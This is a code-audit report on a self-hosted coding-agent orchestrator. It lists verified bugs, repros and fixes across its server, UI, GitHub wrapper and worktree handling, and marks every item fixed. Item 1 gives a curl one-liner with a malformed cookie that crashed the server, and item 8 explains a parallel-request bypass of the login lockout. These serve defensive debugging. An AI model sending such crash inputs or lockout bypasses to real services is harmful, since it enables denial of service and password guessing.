# Audit: server, orchestrator, GitHub wrapper, UI

**Status (2026-09-25, task #71):** items 1-21 fixed (rounds 1-2); round 3: #22-#26 fixed.

_Task #12, 2026-09-24. Items were open when audited; a `- **Fixed** (task #N)` line marks one resolved since. Each item was verified by reading the code; #1 was also reproduced
against a throwaway instance (`PORT=3999 CW_DATA_DIR=$(mktemp -d)`). The items are ranked by value. Each fix
is sized to fit one 15–45 minute task._

Checked and found no issue: static serving only serves exact-match paths (`PUBLIC_PATHS`, `VENDOR`, `/app.js`,
`/app.css`), so there is no path traversal. `/ws` and `/auth/check` upgrades both require a valid session and
a same-origin request. Caddy's `reverse_proxy` overwrites `X-Forwarded-For`, so the login IP can't be spoofed.

---

### 1. [high] A malformed session cookie crashes the whole server before login (server.mjs:83)
- **What:** `parseCookies` calls `decodeURIComponent` without a try/catch. The HTTP handler is `async` (server.mjs:930)
  and has no try/catch, so the thrown `URIError` becomes an unhandled rejection, and Node 22 exits the process.
  The upgrade handler (server.mjs:1119) throws synchronously too.
- **Repro (verified):** `curl -H 'Cookie: cw_session=%E0%A4%A' http://127.0.0.1:3999/api/status` → the process dies with
  `URIError: URI malformed at parseCookies`. Anyone on the internet can take the app down with one request.
- **Fix:** Wrap the decode in try/catch and skip bad parts. Also wrap the body of the request handler in try/catch
  that returns a 500, so any later throw can't kill the process. Add a regression case to test/server.test.mjs.
- **Fixed** (task #14): `parseCookies` now skips undecodable parts, and the HTTP and upgrade handlers are wrapped (500 / socket destroy). A regression test covers both paths.

### 2. [high] A second instance on the same data dir steals and double-runs the live orchestrator's tasks (orchestrator.mjs:1556)
- **What:** At startup the orchestrator runs `UPDATE tasks SET status='queued' WHERE status='running'` and starts its
  own scheduler. If `CW_DATA_DIR` is unset (server.mjs:15), the second instance uses the live `data/`. The BRIEF's
  own test recipe is `PORT=3999 node server.mjs &`, so following it without `CW_DATA_DIR` hits this.
- **Repro/reasoning:** While the live app is running a task, start `PORT=3999 node server.mjs`. The task is requeued
  and claimed again by the new scheduler, so two Claude sessions work on one checkout and both commit. The new
  instance also rewrites `convos.json` and `sessions.json` (server.mjs:127-150, :76).
- **Fix:** Take an exclusive lock file (`data/orchestrator/lock` with the PID, checked with `process.kill(pid, 0)`)
  in `createOrchestrator`. If another live process holds it, don't requeue and don't schedule (log a warning).
  Also update BRIEF/README to say that test instances must set `CW_DATA_DIR`.
- **Fixed** (task #16): `createOrchestrator` takes `data/orchestrator/lock` via `takeLock` (exclusive create with the PID, stale PIDs checked with `process.kill(pid, 0)`). A second instance on a locked data dir logs a warning and does not requeue or schedule tasks.

### 3. [high] A chat context rollover orphans the new Claude runtime (server.mjs:702, :815-823)
- **What:** When a chat exceeds `CHAT_CONTEXT_LIMIT`, `sendUserMessage` closes the old query and immediately calls
  `startRuntime`, which registers the new runtime. The old runtime's async loop ends later, and its `finally`
  runs `runtimes.delete(convo.id)` unconditionally, which removes the **new** runtime from the map.
- **Consequence:** The new `claude` process keeps running but can't be reached. Interrupt, permission replies
  (`answerPermission`), `set_mode` and `set_model` all silently do nothing, and the UI shows "not busy" during the
  reply. The next message starts a second process (a leak). The old loop also emits a misleading
  "Claude session ended" error into the chat.
- **Fix:** In the finally block (and at the error emit), act only if `runtimes.get(convo.id) === rt`. Mark closed
  runtimes (e.g. `rt.retired = true`) so their exit is silent.
- **Fixed** (task #17): rollover and chat delete call `retireRuntime` (runtimes.mjs), which marks the runtime `retired`, removes it from the map and closes it. The runtime loop ignores messages once it is retired, and it emits errors or deletes from the map only when `!rt.retired && runtimes.get(convo.id) === rt`, so the new runtime is left alone. test/runtimes.test.mjs covers this.

### 4. [med] Unawaited promises and async intervals can crash the process (server.mjs:780, :568, :596)
- **What:** `syncGit(...)` is fire-and-forget in the `result` handler (:780) and in `onCommit` (:568). The 3-minute
  GitHub retry is an `async` `setInterval` callback (:596). Inside these calls, `ensureLocalRepo` does a
  `fs.writeFileSync` (github.mjs:38) and `saveConvos()` does sync writes. Any throw from them (the folder was
  deleted mid-flight, ENOSPC, EACCES) is an unhandled rejection that takes down the server. There is no
  `process.on('unhandledRejection')` fallback.
- **Fix:** Add `.catch((e) => console.error(...))` to these call sites and wrap the interval body in try/catch.
  Consider a logging `unhandledRejection` handler as a backstop.
- **Fixed** (task #15): `syncGit`/`setupRepo`/`refreshUsage`/`refreshClaudeAuth`/chat-loop fire-and-forget calls now `.catch` and log, the GitHub retry interval body is in try/catch, and a logging `process.on('unhandledRejection')` backstop is installed.

### 5. [med] The "Answer owner's message" plan task can run at the same time as a live chat planner turn (orchestrator.mjs:1212, :1121)
- **What:** Plan-kind tasks call `plannerRun`, which resumes `project.chat_session_id`, but `planTurn` doesn't mark
  them. Server-side `planning` and orchestrator `planningProjects` only track chat turns. If the owner sends a
  chat message after the limit resets while the plan task is running, two `claude --resume <same id>` processes
  write to the same session. Separately, :1121 adds a new plan task on every rate-limited chat turn without the
  "already queued" check used at :1086, so duplicate plan tasks pile up.
- **Fix:** Keep a per-project "planner busy" guard that both `planTurn` and plan-task `execute` check. The chat
  side should queue behind it (or the plan task should defer while the chat side is busy). Reuse the :1086
  existence check at :1121.
- **Fixed** (task #46): `planningProjects` records who holds the planner session ('chat'/'task'); claimNext skips plan tasks while a chat turn runs, a chat message during a plan task is saved and answered by a follow-up plan task, and `deferMessage` dedupes "Answer owner's message" tasks (test/planner-guard.test.mjs).

### 6. [med] Deleting a chat mid-plan keeps planning and reactivates the paused project (server.mjs:1021-1029)
- **What:** DELETE calls `orch.abortPlan` and `detachConvo` but doesn't clear `planQueue`. When the aborted turn
  returns, `orchestratorTurn`'s loop takes the queued text and calls `orch.planTurn` again for the deleted convo.
  `ensureProject` sets `convo_id` back, and `planTurn` sets `status='active'` (orchestrator.mjs:1081), which undoes
  the detach/pause. The replies are dropped, because `emit` ignores unknown convos.
- **Repro:** In Orchestrator Mode, send a message, send a second one while the first is planning, then delete the chat.
- **Fix:** Run `planQueue.delete(c.id)` in the DELETE handler, and stop the loop in `orchestratorTurn` if
  `!findConvo(convo.id)`.
- **Fixed** (task #39): the DELETE handler clears `planQueue`, and `orchestratorTurn` stops its loop and skips saving once the convo is gone.

### 7. [med] Messages sent while the WebSocket is reconnecting are silently lost (public/app.js:1049, :1276)
- **What:** `send()` drops the message when `readyState !== 1`. The composer submit handler then clears the input
  and the stored draft anyway. After a brief network drop or a server restart, the owner's typed message vanishes
  with no error.
- **Fix:** Make `send()` return a boolean. On `false`, keep the text, show a "Not connected — will send when
  reconnected" notice, and either queue the message for `onopen` or leave the text in the composer.
- **Fixed** (task #18): `send()` returns whether it sent. On `false` the composer submit handler keeps the text and its saved draft and shows a "Not connected, reconnecting. Your message was kept." notice. Nothing is queued, so a message is never sent twice.

### 8. [med] The login lockout can be bypassed with parallel requests (server.mjs:944-953)
- **What:** `lockedFor(ip)` is checked before `await readBody(req)`, so every request in a concurrent burst passes the
  check before any failure is recorded. After the 5th failure, `recordFailure` resets `count` to 0, so failures
  still in flight keep being evaluated. A burst of N requests tests N passwords. The `attempts` map is also never pruned.
- **Fix:** Re-check `lockedFor(ip)` after `readBody` (immediately before the synchronous `checkPassword`, which
  makes it atomic). Prune expired entries in `recordFailure`.
- **Fixed** (task #35): the login handler re-checks `lockedFor(ip)` after `readBody`, right before `checkPassword`, and `recordFailure` prunes lapsed entries. A parallel-burst regression test covers it.

### 9. [med] Expired or revoked sessions keep their WebSocket open (server.mjs:1131)
- **What:** The 30 s keepalive only checks `sessions[token]`. It ignores `exp`, and it doesn't call `syncSessions()`.
  A 24-hour session keeps receiving every broadcast (chat, tasks, metrics) and can keep sending commands long
  after it expires. After `set-password` rewrites sessions.json, open sockets stay connected until some HTTP
  request happens to trigger `syncSessions`.
- **Fix:** In the interval, call `syncSessions()` and close with 4001 when `!s || s.exp < Date.now()`.
- **Fixed** (task #38): the keepalive calls `syncSessions()` and closes with 4001 on a missing or expired session; `CW_WS_KEEPALIVE_MS` overrides the 30 s period, and a regression test covers removal and expiry.

### 10. [med] Orchestrator git commits block the whole server's event loop (orchestrator.mjs:986-996)
- **What:** `gitCommit`/`ensureGit` use `execFileSync` with a 120 s timeout, up to 4 calls per commit. A slow
  `git add -A` on a large tree, or a pre-commit hook (husky, lint-staged, tests), freezes all HTTP, WebSocket,
  metrics and chat streaming until it finishes.
- **Fix:** Switch `git()` to promisified `execFile` and make `gitCommit` async. It is already called from async
  paths (`finishWork`, `verifyFailed`, `fail`, `finishReflection`), so await it there.
- **Fixed** (task #42): `git()` uses promisified `execFile` (16 MB maxBuffer); `gitCommit`/`ensureGit` are async, serialized per repo, and awaited by their callers (`setConvoMode` fires `ensureGit` without awaiting it, and `planTurn` awaits it).

### 11. [low] `runCheck` ignores cancellation and leaks background processes (orchestrator.mjs:416-431, :1322)
- **What:** The done-when check gets no abort signal. Cancelling or pausing a task during its check leaves the check
  running for up to `verifyTimeoutSec` (600 s). The process group is only killed on timeout, so anything the check
  started in the background (for example `node server.mjs & sleep 2 && …`) outlives a successful check.
- **Fix:** Pass the task's `signal` to `runCheck` and kill `-child.pid` on abort. Also kill the group
  (ignoring ESRCH) in the `close` handler.
- **Fixed** (task #45): `runCheck` takes the task's signal (abort kills the group, a paused/preempted check requeues like an interrupted run) and kills the group on exit/close; test/runcheck.test.mjs.

### 12. [low] Concurrent `ensureRepo` calls can create duplicate GitHub repos (github.mjs:55-67)
- **What:** `setupRepo` (server.mjs:1013, not awaited) calls `gh.ensureRepo` directly, outside `push`'s `inflight`
  dedupe. If the first chat reply finishes (`syncGit` → `push` → `ensureRepo`) or the 3-minute retry fires before
  setup completes, both calls see no `origin` and both run `gh repo create`. That leaves a stray `name-2` repo or
  an "origin already exists" error in `convo.git.error`.
- **Fix:** Keep a per-dir inflight map in `ensureRepo` itself, like `push`.
- **Fixed** (task #44): `ensureRepo` shares one in-flight run per dir (`ensuring` map); test/github.test.mjs checks two parallel calls make one `gh repo create` via test/fixtures/gh-stub.mjs.

### 13. [low] One corrupt JSONL line blanks a whole chat history or task run log (server.mjs:156, orchestrator.mjs:1531)
- **What:** `readLog` and `taskDetail` call `JSON.parse` on every line inside a single try, so one bad line (for
  example a partial write when the process was killed) returns `[]`. The chat then opens empty, and `chatRecap`
  loses all its context.
- **Fix:** Parse each line in its own try and skip bad lines, as `loadSeries` does (server.mjs:303).
- **Fixed** (task #40): `parseJsonl` (exported from orchestrator.mjs) skips bad lines; `readLog`, `taskDetail` and `loadSeries` use it; test/jsonl.test.mjs covers it.

### 14. [low] An oversized request body hangs the request forever (server.mjs:920-925)
- **What:** `readBody` calls `req.destroy()` once the body passes 1 MB, but it never resolves or rejects. The
  awaiting handler (and its closure) stays pending, and the client never gets a 413.
- **Fix:** Resolve `null` on destroy/`error`/`close`, and have callers answer 413/400 when the body is `null`.
- **Fixed** (task #36): `readBody` rejects with an `HttpError` on overflow (pauses, then the wrapper sends 413 with `Connection: close` and destroys), bad JSON (400), error or abort; a regression test covers it.

### 15. [low] The server panel always shows the terminal as down (server.mjs:484)
- **What:** `slowMetrics` checks the `claude-term` unit, but the live terminal unit is `claude-shell` (verified:
  `systemctl is-active claude-term` → inactive, `claude-shell` → active). The comment at server.mjs:1 also says
  `/term/`, but Caddy serves `/shell/`.
- **Fix:** Check `claude-shell` (and maybe `claude-tmux`) and correct the comment.
- **Fixed** (rename, tasks #20/#23): `slowMetrics` now checks the `agent-orch-shell` unit (with `agent-orch` and `caddy`), and the server.mjs:1 comment says `/shell/`.

### 16. [medium] The verifier drops the prose around the check command (orchestrator.mjs:393)
- **What:** `extractCommand` runs only the first backticked command from "Done when" and ignores the words
  around it. So "`grep …` prints nothing and `npm test` passes" becomes a bare `grep`, which exits 1 when
  nothing matches. The check fails exactly when the work is correct (task #20 kept failing this way), and
  `npm test` never runs.
- **Fix:** Have the planner write absence checks as one command (`! grep … && npm test`), and/or make
  `extractCommand` join every backticked command in the text with `&&`.
- **Fixed** (task #33): with no triple-backtick block, `extractCommand` joins every command-like single-backtick snippet with ` && ` (file names/identifiers ignored, any unsafe one → no check); the planner prompt says absence checks use `! grep`.

## Round 2 (2026-09-25, task #54): multi-agent adapters, routing, non-Claude chat

Checked and found no issue: every adapter strips its own billing vars and chat/orchestrator runs start from the
Anthropic-stripped env; codex forces `forced_login_method="chatgpt"` and treats an API-key login as logged out;
the planner guard (`planningProjects` is set synchronously before any await on both paths, `claimNext` skips plan
tasks during a chat turn); `applyRoute` upsert/delete; chat delete mid-turn (`emit` drops events for a deleted convo).

### 17. [high] A codex/agy auth failure blocks all Claude work, forever, as "Claude Code is not signed in" (orchestrator.mjs:1441)
- **What:** `handle` treats every `auth_error` the same: requeue the task, set the global `blocked_until` +600 s and
  say Claude is not signed in. A codex/agy task keeps its route (`agentStatus` only checks `codex login status` or
  that an agy token file exists), so an expired agy token (the run is killed on the OAuth prompt), agy in API-key
  mode (`modelProvider: "gemini"`, refused before spawning), or a codex 401 re-fails every 10 minutes and the whole
  orchestrator, Claude tasks included, never runs again.
- **Fix:** For a non-Claude `auth_error`, don't touch `blocked_until`: mark the agent unusable (e.g. a
  `loginCache` entry set to false for the TTL, or a kv "agent X auth failed until …") so `resolveRoute` falls back
  to Claude with a route_note, requeue the task, and log "<agent> is not signed in".
- **Fixed** (task #59): a non-Claude auth_error sets kv `agent_auth_failed:<agent>` for 600 s instead of `blocked_until`; `routeFor` treats that agent as 'sign-in failed' and falls back to Claude (test/routing.test.mjs).

### 18. [med] A non-Claude usage limit pauses every Claude task until that agent resets (orchestrator.mjs:968, agents.mjs:420)
- **What:** `recordGovernor` sets the global `blocked_until` for any `rate_limited` outcome. Codex's weekly limit
  ("try again at <date days away>") therefore idles the Claude subscription for days, which defeats the point of
  the orchestrator. agy's check is also loose: `AGY_LIMIT_RE` (`quota|exhausted|rate.?limit|429`) is matched against
  the whole stderr, so any failed agy run whose log mentions "quota" is read as a limit and blocks everything
  for the unknown-reset backoff.
- **Fix:** Keep a per-agent block (kv `blocked_until:<agent>`): `resolveRoute` falls back to Claude (or `claimNext`
  defers only tasks routed to that agent) while it is set; only Claude limits set the global block. Test
  `AGY_LIMIT_RE` against `result.error` only, not stderr.
- **Fixed** (task #60): only a Claude limit sets the global `blocked_until`; a codex/agy limit sets kv `blocked_until:<agent>` (reset + buffer, or the unknown-reset backoff) and `routeFor` sends that agent's tasks to Claude ('usage limit until …'); an ok run clears only its own agent's block. agy limits are read from `result.error` only (tests in test/routing.test.mjs and test/agents.test.mjs).

### 19. [med] A stale codex/agy session is resumed forever (server.mjs:847, orchestrator.mjs:1418)
- **What:** Resume recovery only looks for Claude's `no conversation found`. Real codex prints
  `thread/resume failed: no rollout found for thread id …` (verified with /usr/bin/codex and a made-up id). In chat,
  `res.sessionId` starts as `resume`, so `convo.agentSession` keeps the dead id and every later message in that
  chat fails the same way (switching agents and back doesn't clear it). In the orchestrator the task retries on the
  same `session_id` until `maxAttempts` and then fails.
- **Fix:** Recognise the non-Claude "session not found" messages (`no rollout found`, agy's equivalent) in one
  helper, e.g. `res.errorCode = 'no_session'` set in the adapter; on it, drop `convo.agentSession` / `session_id`
  and retry once without resume.
- **Fixed** (task #61): codex (`no rollout found`) and agy (`conversation/session … not found`) resumed runs set `errorCode: 'no_session'`; `isMissingSession(res)` in agents.mjs also covers Claude's text. Chat drops `convo.agentSession` and retries once fresh; the orchestrator clears `session_id` and requeues fresh (planner too). Test in test/agents.test.mjs.

### 20. [med] A model-only route with a model not in `AGENTS[*].models` runs Claude with that model (orchestrator.mjs:455)
- **What:** `pick` uses `normalizeAgent(agent) || agentForModel(model) || 'claude'`, and `agentForModel` only knows
  the short hard-coded lists. The owner's own example "use gemini-2.5-pro for UI work" (a route with
  `model: "gemini-2.5-pro"` and no agent) resolves to `{agent:'claude', model:'gemini-2.5-pro'}`, so every UI task
  errors on Claude until it fails. An agent+model mismatch (`codex` + `opus`) is also passed straight through.
- **Fix:** Infer the agent from the model's family (`/^(gpt|o\d|codex)/` → codex, `/^gemini/` → antigravity,
  `/^(claude|opus|sonnet|haiku)/` → claude) when it isn't listed, and drop a model that clearly belongs to another
  agent (log it); have `parseTasksBlock` reject such routes too.
- **Fixed** (task #62): `agentForModel` falls back to the model family (gpt/o\d/codex, gemini, claude/opus/sonnet/haiku); `resolveRoute` drops a foreign model for an explicit agent (`dropped`, logged, in route_note), the Claude fallback always uses project.model, and `extractTasks` strips such models from tasks/routes (`payload.dropped`, logged by `queuePayload`).

### 21. [low] CLI adapters leave background processes running after a normal exit (agents.mjs:222-232)
- **What:** `spawnJsonl` only kills the process group on abort or `stopOn`. When codex/agy exits normally, anything
  its tools started in the background (a dev server, `sleep`, a watcher) keeps running (verified: a stub that
  spawns `sleep 300` and exits cleanly leaves it alive). On abort, `finally` clears the SIGKILL timer as soon as
  the leader exits, so group members that ignore SIGTERM also survive. Same pattern as #11.
- **Fix:** After `close`, `killGroup('SIGTERM')` (ignore ESRCH) and keep the SIGKILL follow-up timer (unref'd)
  instead of clearing it in `finally`.
- **Fixed** (task #63): after the CLI closes, `spawnJsonl` SIGTERMs its process group if any member is left and keeps the unref'd 5 s SIGKILL follow-up (no longer cleared in `finally`), so the result isn't delayed; test/fixtures/bg-stub.mjs + test/agents.test.mjs.

## Round 3 (2026-09-25, task #71): sign-in connections, drain/restart-when-idle, limit notices

Checked and found no issue: every /api/connections route sits behind `isAuthed` and the POST same-origin check, the
`:id` is looked up in the entry map (unknown → 404), and the WS `connections` broadcast only reaches authed sockets.
The login command is built from fixed argv quoted with `shq`, and env var names come from the server's own env, so
there is no shell injection. The pasted code is typed with `send-keys -l` and CR/LF is refused, so it can't run
commands. The scraped URL only matches `https://` patterns, so the panel's link can't be `javascript:`. Claude logout
needs strict `confirm === true` (only sent after the browser `confirm()`). `limitReset` works in fractions/epoch
seconds on both paths, and codex/agy `resetsAt` are epoch seconds like `withUntil` expects. `refreshRepo` and
`commitsSinceBoot` can't reject: `gh.remoteOf` and the `git` helper resolve on error.

### 22. [med] A double "Connect" starts two logins; the orphan's timers later kill a new sign-in as "timed out" (connections.mjs:156-175)
- **What:** `start` checks `logins.get(id)?.state === 'waiting'` and only sets the entry after two awaited tmux calls.
  A second start that arrives in that window runs `kill-session` on the first one's new session and makes its own.
  Both calls then `logins.set`, the second overwrites the first, and the first `setInterval` and 10-minute `deadline`
  are never cleared. `finish` looks the login up by id rather than by identity, so when the orphaned deadline fires
  it ends whichever login is current then. The same gap affects cancel: `cancel` while `start` is still in flight
  finds no waiting entry, returns `{ok:true}`, and the login then starts anyway. A slow `probe()` (up to 8 s) from an
  old login can also `finish` a newer one.
- **Repro (verified):** with real tmux on a scratch socket, 20 pairs of `start('x')` calls 0-19 ms apart gave 6 cases
  with two pollers. Using a fake tmux and `timeoutMs: 400`: double start, cancel, start again, and the new login fails
  after 82 ms with "timed out after 10 minutes". Cancel 15 ms into a start returned ok, and the state stayed `waiting`.
  In the UI the Connect button stays clickable until the reply arrives, so a double-click is enough.
- **Fix:** Put the placeholder `{state:'waiting', …}` into `logins` synchronously before the first await (or keep a
  per-id `starting` promise that later callers await). Have `finish(id, state, err, l)` act only when
  `logins.get(id) === l`, and have the timer, deadline and probe closures pass their own `l`. `cancel` during a
  start should mark the placeholder cancelled so `start` kills the session it just made.
- **Fixed** (task #75): `start` sets the entry before its first await; `finish`/poll/deadline/probe act only on their own `l`; a cancel mid-start kills the new session. Three race tests in test/connections.test.mjs.

### 23. [med] After a server restart (or a missed WS message) the Connections panel is stuck on "Signing in…", and the login's tmux session is orphaned (public/app.js:1340-1348, connections.mjs:188-192)
- **What:** Login state lives only in memory, and nothing clears the `agent-orch-login` socket at boot. When the
  server restarts mid-login (now routine via "Restart when idle", #24), the `login-<id>` session keeps running. agy
  never exits and `claude auth login` waits at its paste prompt, so both stay alive until someone starts that same
  login again. The browser only loads connections once at boot (`refreshConnections`, app.js:2732) and after that
  relies on WS `connections` broadcasts. `ws.onopen` refetches status but not connections, so the panel keeps showing
  the old `waiting` login. Submit then fails with an alert ("No sign-in in progress"). Cancel hits `finish`, which
  does nothing, and the response is `{ok:true}` with no `login` and no broadcast, so the panel doesn't change. The
  Connect button is hidden while `waiting`, so only a page reload gets out. The same happens when the phone
  sleeps through the `done`/`failed` broadcast.
- **Fix:** Call `refreshConnections()` in `ws.onopen`. Have `cancel` return the current `login` (or null), and have
  `connAction` apply it even when it's null. At startup, run `tmux -L agent-orch-login kill-server` (ignoring
  errors) in `createConnections` or server boot.
- **Fixed** (task #76): `ws.onopen` calls `refreshConnections()`; `cancel` returns `login` (null when none) and `connAction` applies it; `createConnections` runs `kill-server` on the login socket at startup and `start` waits for it.

### 24. [med] "Restart when idle" exits in the middle of a chat reply or planner turn (server.mjs:1141-1146, orchestrator.mjs:1392-1395)
- **What:** `drain()` waits only for orchestrator `running` tasks. It ignores Claude chat runtimes that are
  replying (`rt.busy`), non-Claude chat turns (`agentTurns`), and chat planner turns (`planning` / `planningProjects`
  'chat'). `planTurn` also doesn't check `draining`, so a message sent while draining still starts a planner run.
  With no task running, `process.exit(0)` fires at once and kills the owner's in-flight reply or orchestrator-mode
  plan (a planner reply and its tasks block are lost, and the chat shows the WS dropping). With tasks running, it
  exits when the last task ends, whatever chat work is going on then. There is also no way to cancel a drain:
  `restartPending` only resets on exit, so a long task keeps the orchestrator idle, and the banner hides its
  buttons, until that task finishes.
- **Fix:** Have the server's exit wait for `orch.drain()` **and** for no busy chat (`runtimes` busy, `agentTurns`,
  `planning`): re-check on each chat `result`/turn end. While draining, queue new chat planner turns (or refuse them
  with a notice). Optionally add `POST /api/restart-when-idle {cancel:true}`, which clears `draining`/`restartPending`.
- **Fixed** (task #77): the exit waits for `orch.drain()` then polls `chatIdle` (runtimes.mjs) every 2 s; `planTurn` saves messages sent while draining for after the restart; `POST /api/restart-when-idle {cancel:true}` clears `restartPending` and calls `orch.undrain()`; test/drain.test.mjs.

### 25. [low] A pasted Claude code that starts with `-` is read as tmux flags, and the UI says it was sent (connections.mjs:183-185)
- **What:** `send-keys -t … -l <code>` doesn't put `--` before the code, so tmux's getopt parses a leading `-` as
  options. Claude's OAuth codes are base64url, so about 1 in 64 start with `-`. The send fails, `submitCode` ignores
  the tmux result and still sends a bare `Enter` to the CLI, and it returns 200, so the panel says "Code sent,
  checking…" until the 10-minute timeout.
- **Repro (verified, tmux 3.6):** `tmux send-keys -t =t: -l '-abc_def'` → `command send-keys: unknown flag -a`, exit 1.
- **Fix:** Send `['send-keys', '-t', target, '-l', '--', code]`. If the send fails, return 500 (the session is gone)
  and don't send Enter.
- **Fixed** (task #74): `submitCode` types the code with `send-keys -t … -l -- <code>`; if that send fails it returns 500 and skips Enter; test/connections.test.mjs.

### 26. [low] Old limit notices read "at your usage limit until now" when the chat history is reloaded (public/app.js:1773-1775)
- **What:** `withUntil` formats `{until}` when the event is rendered. Persisted notices are replayed on every chat
  open, and `fmtResetAt` returns `'now'` for a past time. So yesterday's notice reads "…until now; the orchestrator
  answers then.", "Retrying around now." or "it resets now.", which looks like a current limit.
- **Fix:** When `until` is in the past, render the absolute time (e.g. "until Thu 3:10 PM") without the relative
  part, or add "(passed)".
- **Fixed** (task #78): `withUntil` uses `fmtUntil`, which shows only the absolute time ("Thu 3:10 PM") for a past `until`; test/limit-reset.test.mjs evaluates it from app.js.

## Round 4 (2026-09-26, task #165): worktrees, parallel scheduling, delegation, opencode/kiro/copilot

Checked and found no issue: `serialGit` chains every main-tree operation per project path (worktree creation, merge,
park, boot cleanup, `gitCommit`), and `mergeTask` commits the main tree before `mergeBack`, so the fast-forward never
lands on a dirty tree it would overwrite. A failed `--ff-only` throws before anything is removed, and the rebased branch
is kept. A restart mid-integration resumes correctly: `startIntegration` sees `MERGE_HEAD` and leaves the merge alone. `spreadAssign`
honours `agentSlots`. At default settings (`concurrency` 2 < `agentSlots` 3), the non-boost `delegate()` fallback in
`claimNext` can't run when every slot is full. delegate.mjs is clean: `nextModel` skips the current model and any
agent that is unconnected, unlisted, blocked or has a window ≥90%, and an empty or null snapshot means the task waits.
`spawnJsonl` kills the process group on abort and on exit for all three new CLIs. Each new adapter strips its
`envFilter` from `CLAUDE_ENV`, in chat and in orchestrator runs.

### 27. [high] A task worktree with a detached HEAD is deleted with its uncommitted work, and the next run uses the live main tree (worktrees.mjs:47-56, 148-157)
- **What:** `listWorktrees` only lists worktrees whose porcelain block has `branch refs/heads/agent-orch/task-N`. A
  worktree on a detached HEAD isn't listed. That happens after a rebase killed mid-`mergeBack` (a crash or restart), or
  when an agent runs `git checkout <sha>`, `git switch --detach` or an interactive rebase (`Bash(git:*)` is a safe tool).
  On the next run, `ensureWorktree` doesn't find the worktree, so it runs `worktree prune`. The directory still exists,
  so git keeps the registration. `ensureWorktree` then `rm -rf`s the directory as a "stray directory", and
  `worktree add` fails ("missing but already registered worktree"). `taskWorktree` returns null. If nothing else runs in
  the project, `runTask` runs the task in the **live main tree** and ignores the commits on its branch. Otherwise the run
  throws and uses up an attempt. `cleanupWorktrees` never sees the worktree either. `taskWorktree` also commits
  whatever sits in the main tree first, because it thinks no worktree exists.
- **Repro (verified):** Create a worktree with `ensureWorktree(info, 7)`, commit a file in it, run
  `git checkout --detach` there and write an uncommitted `wip.txt`. `listWorktrees` → `[]`. `ensureWorktree(info, 7)`
  throws `'…/repo-task-7' is a missing but already registered worktree`, and the directory (with `wip.txt`) is gone.
  A second call succeeds with a fresh checkout of the branch.
- **Fix:** In `listWorktrees`, also list entries by directory name (`<repo>-task-<id>` under `worktreesRoot`), whatever
  their HEAD. When reusing a worktree, re-attach it: abort a leftover rebase (`rebase --abort` if `rebase-merge` or
  `rebase-apply` exists), then `git switch agent-orch/task-N` if HEAD is detached (commit first). Never `rmSync` a
  directory that `git worktree list` still has registered.
- **Fixed** (task #170): `listWorktrees` also recognises `<repo>-task-<id>` directories whatever their HEAD; a reused worktree is `reattach`ed (leftover rebase aborted, detached work committed onto the task branch, a diverged tip kept as `…-before-<sha>`); a registered directory is never `rmSync`ed; test/worktree.test.mjs.

### 28. [med] A `needs_integration` task is stuck for good when its integrator fails or is cancelled (orchestrator.mjs:2175-2190, 2204-2215, 2272-2283)
- **What:** Only the integrator finishing `done` moves the owner out of `needs_integration` (finishWork, 2169).
  Suppose the integrator fails (verification, `maxAttempts` or `maxContinuations`, including the loop in #29), or the
  owner cancels just the integrator. `fail`/`cancel` then cascade from the integrator's id, but nothing depends on the
  integrator, so nothing happens. The owner stays `needs_integration`, `cleanupWorktrees` keeps its worktree forever,
  and its `after` dependents stay queued with no notice (RUNNABLE waits for `done`). The owner can't be retried
  (retry only accepts failed/cancelled). The only ways out are to find and retry the integrator by hand, or to cancel the owner.
- **Fix:** When an integrator ends failed or cancelled, move its owner to the same status (the owner's worktree is then
  parked on its branch by `parkTask`) and cascade to the owner's dependents. Retrying the owner or the integrator then
  revives the chain. At minimum, log a warning on the owner.
- **Fixed** (task #172): `releaseOwner` moves a `needs_integration` owner to failed/cancelled with its integrator, cascades to the owner's dependents and parks its worktree; test/integrator-fail.test.mjs.

### 29. [med] An integrator never passes when the merged-in branch adds a Markdown heading underlined with exactly 7 `=` (worktrees.mjs:80-91)
- **What:** `unresolvedFiles` flags every file that `git diff HEAD --check` reports as a "leftover conflict marker", then
  confirms it with `/^={7}$/m`. A setext heading like `Install\n=======` or `Summary\n=======` matches both. During
  integration the diff against HEAD includes everything the main branch changed, so such a heading added on main
  since the task branched gets reported as "Still conflicted" on every attempt. The integrator then fails, and #28 leaves
  its owner stuck.
- **Repro (verified):** In the task worktree commit `a.txt`. On main, commit `README.md` with
  `x\n\nInstall\n=======\n\nrun it\n`, then run `startIntegration`. It returns `['README.md']` (auto-merged,
  no real conflict), and so does `unresolvedFiles`.
- **Fix:** Only check files that were unmerged when the integration started (keep that list, e.g. in the task row).
  Count a file as unresolved only if it has a `<<<<<<<` line followed later by a `>>>>>>>` line, rather than any
  `=======` line.
- **Fixed** (task #171): `unresolvedFiles` counts a file only if a `<<<<<<<` line is followed later by a `>>>>>>>` line; a lone `=======` never counts; test/worktree.test.mjs.

### 30. [low] With two failed prerequisites, retrying them in one order leaves the dependent failed (orchestrator.mjs:1178-1195)
- **What:** C depends on A and B. A fails, so `cascadeBlock` marks C `failed` with `blocked: #A (…)`. B then fails, and
  its cascade skips C because C is no longer queued. Retry A: `reviveBlocked(A)` leaves C alone because B is still down.
  Retry B: `reviveBlocked(B)` only revives rows whose result starts with `blocked: #B`, so C (blocked by #A) stays
  failed, along with its own dependents. Retrying B first and then A works.
- **Fix:** In `reviveBlocked(root)`, revive any failed/cancelled dependent whose result has the blocked prefix of **any**
  of its direct prerequisites, once none of them is failed or cancelled. Alternatively, keep a `blocked_by` list.
- **Fixed** (task #176): `reviveBlocked` revives a dependent blocked by any task once that cause and all its direct prerequisites are back up; test/revive-deps.test.mjs.

### 31. [low] A declared directory whose name contains a dot (`.agent-orch`, `.github`, `fixtures.v2`) only covers itself (parallel.mjs:46-50)
- **What:** `segs` treats a pattern as a directory only if it ends in `/` or its last segment has no `.`. So
  `filesOverlap(['.agent-orch'], ['.agent-orch/AUDIT.md'])` is `false`, and two tasks that both change files under
  `.agent-orch/` run in parallel. They then conflict at merge and need an integrator.
- **Repro (verified):** `filesOverlap(['.agent-orch'], ['.agent-orch/AUDIT.md'])` → false,
  `filesOverlap(['test/fixtures.v2'], ['test/fixtures.v2/x.js'])` → false, and `filesOverlap(['public'], ['public/app.js'])` → true.
- **Fix:** Also treat a plain path without wildcards as a directory when it has no extension-like suffix after its last
  non-leading dot, or simply always let a non-glob path cover `path/**` too. Being conservative here only costs
  parallelism.
- **Fixed** (task #173): a declared path without wildcards covers its whole contents, dotted names included; test/parallel.test.mjs.

